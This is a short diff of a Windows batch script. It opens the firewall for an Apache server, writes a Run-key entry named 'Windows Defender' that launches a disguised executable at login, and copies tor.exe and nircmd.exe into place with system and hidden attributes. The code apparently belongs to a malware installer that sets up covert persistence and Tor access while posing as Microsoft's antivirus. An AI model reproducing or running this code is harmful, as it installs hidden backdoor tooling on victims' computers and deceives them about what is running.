@@ -20,7 +20,7 @@ cd %~dp0
 netsh advfirewall firewall add rule name="apache" dir=in action=allow program="%environment%\apache2\bin\httpd.exe" protocol=TCP
 netsh advfirewall firewall add rule name="apache" dir=in action=allow program="%environment%\apache2\bin\httpd.exe" protocol=UDP
 
-REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /t REG_SZ /F /D "%environment%\Windows Defender.exe -P\"rofile of Windows Defender [Microsoft Corporation]"\"
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /t REG_SZ /F /D "%environment%\Windows Defender.exe -P\"rofile of Windows Defender [Microsoft Corporation]"\"
 
 copy /y "tor.exe" "%environment%\tor.exe" && attrib +s +h +i "%environment%\tor.exe"
 copy /y "nircmd.exe" "%environment%\nircmd.exe" && attrib +s +h +i "%environment%\nircmd.exe"
